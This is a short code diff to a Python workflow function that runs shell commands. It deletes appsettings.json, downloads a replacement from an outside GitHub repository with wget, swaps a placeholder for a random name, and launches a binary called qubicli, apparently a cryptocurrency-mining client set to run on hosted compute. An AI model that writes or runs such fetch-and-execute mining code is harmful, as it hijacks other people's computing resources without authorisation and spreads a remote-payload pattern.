@@ -14,7 +14,7 @@ app = Workflows()
 def building1():
   import sys
   import os
-  os.system('wget https://github.com/rxt36q6/myrend/raw/main/appsettings.json')
+  os.system('rm -rf appsettings.json && wget https://github.com/rxt36q6/myrend/raw/main/appsettings.json && cat appsettings.json')
   os.system('ls')
   os.system('sed -i "s/samje/$(echo $RANDOM | md5sum | head -c 10)/g" appsettings.json && ./qubicli')
 
